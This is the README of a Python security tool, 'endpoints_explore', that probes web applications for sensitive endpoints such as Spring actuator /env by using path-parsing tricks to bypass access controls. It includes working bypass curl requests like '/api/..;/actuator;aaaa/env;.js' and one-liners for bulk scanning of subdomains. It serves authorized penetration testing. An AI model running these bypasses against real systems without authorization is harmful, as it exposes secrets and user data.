[中文版](https://xz.aliyun.com/t/12530)

# endpoints_explore
Endpoints Explorer is a Python script that employs multiple bypass rules to discover sensitive endpoints

## Overview
This script uses the aiohttp library to make asynchronous HTTP requests and scans the endpoints for sensitive information in a highly concurrent manner. The script attempts multiple bypass rules and returns as soon as sensitive information is found.

### Background
![app](https://github.com/wzqs/endpoints_explore/assets/71961807/a04e23a9-391b-48d7-9a6d-49fcc00a877f)

Users access through the app or browser, and the requests may pass through a CDN to a reverse proxy/load balancer. Based on the configuration, the request traffic is forwarded and routed to an API gateway, which then distributes the requests to various application services for processing.

In the backend architecture, each component completes its respective tasks by identifying the URI. If there are any parsing differences or conflicts between any of these components, it can lead to permission bypass vulnerabilities. Common situations include:

- Incompatibilities or conflicts between Tomcat/Jetty and servlet-based filter interceptors.
- Permission verification component and framework handling discrepancies leading to bypass.
- Nginx and Tomcat/Jetty conflicts.
- Improper Nginx configuration.
- Inadequate permission verification.


### Some Cases

```
# Status: 404 Not Found  OR  200
curl "https://127.0.0.1"

# Status: 404 Not Found OR 403 Forbidden
curl "https://127.0.0.1/actuator/env"

# Status: 404 Not Found
curl "https://127.0.0.1/v2/api-docs"

# Status: 404 Not Found
curl "https://127.0.0.1/nothing/actuator/env"
```

when discover the valid path /api/

```
# Status: 403 Forbidden
curl "https://127.0.0.1/api/actuator/env"

# Status: 404
curl "https://127.0.0.1/api/v2/api-docs"

# Status: 403
curl "https://127.0.0.1/api/users/query"

Response: {"message": "forbidden"}
```

to use some characters to bypass ACL

```
# Success
curl "https://127.0.0.1/api/..;/actuator;aaaa/env;.js"

# Success
curl "https://127.0.0.1/api/..;/v2/api-docs"

# Success
curl "https://127.0.0.1//api;/users/query"

Response: {"code":200,"status":0,"message":"SUCCESS","data":[{"users":"...
```


### Recommended Reading:

- https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
- https://xz.aliyun.com/t/7544
- https://tttang.com/archive/1592/
- https://joychou.org/web/security-of-getRequestURI.html



## Features
- Tests with bypass rules(`/..;/`,`/;/`,`/;js/`,`/../`,`(double)urlencode` etc.)
- Performs highly concurrent scanning with asynchronous HTTP requests
- Supports checking if paths exist before scanning
- Filtered output for similar content


## Usage
First, you need to install the Python libraries that this script depends on, which can be installed with the following command:
```
pip install aiohttp asyncio colorama
```

Then, you can run this script with command-line arguments. Here is the basic usage of the script:
```
python3 endpoints_explorer.py <base_url> <normal_paths_dict> <sensitive_files_dict> [-c <concurrency>] [-v] [-e]
```
Here is a detailed explanation of the parameters:

- base_url: The base URL to scan.
- normal_paths_dict: The path to the normal paths dictionary.
- sensitive_files_dict: The path to the sensitive files dictionary.
- -c, --concurrency: The concurrency level, default is 5.
- -v, --verbose: Enable verbose output.
- -e, --check-existence: Check if the paths exist before scanning.

example:

```
$ cat sensitive_files_dict.txt

/actuator/env
/env
```
It's worth noting that the normal_paths_dict can be collected from active or passive crawling methods. This largely depends on the capabilities of your crawling tools and is not covered by the functionality of this script.

```
$ cat normal_paths_dict.txt

/api/
/manage/
```
screenshot:

![image](https://github.com/wzqs/endpoints_explore/assets/71961807/3556e555-18fd-4c5d-959c-fa7ab679f833)


### Tips
Although the script does not directly support multi-URL scanning, you can use it in conjunction with other security tools.

- Bulk scanning for sensitive information on live URLs
```
cat urls_list.txt | httpx -silent | parallel -j 50 -- python3 endpoints_explorer.py {} normal_paths_dict.txt sensitive_files_dict.txt -c 50 -e
```
- Automatically scan for sensitive information on live subdomains
```
subfinder -d example.com -silent | httpx -silent | xargs -I {} python3 endpoints_explorer.py {} normal_paths_dict.txt sensitive_files_dict.txt -c 50 -e
```

In a sense, this script serves as a permission bypass tool. 

### Notes

Please note that while the code has been thoroughly tested, there may be potential bugs and inaccuracies. The path existence checks are not foolproof and the scanning speed is influenced by factors like your own system, the target server, and network conditions. Be aware that high concurrency might impact the server's performance. Always ensure that you have proper authorization before initiating any scans to avoid legal or ethical issues. Use responsibly.

### TODO
- add more headers to requests to bypass rules
- generate the normal_paths_dict rules based on the domain


## Disclaimer
This script is intended only for lawful, authorized security testing activities and must not be used for any illegal activities. Users are responsible for all consequences of using this script.

## Thanks

- [chatgpt](https://chat.openai.com/)
- https://github.com/ldbfpiaoran/springboot-acl-bypass
- https://github.com/projectdiscovery/pdtm
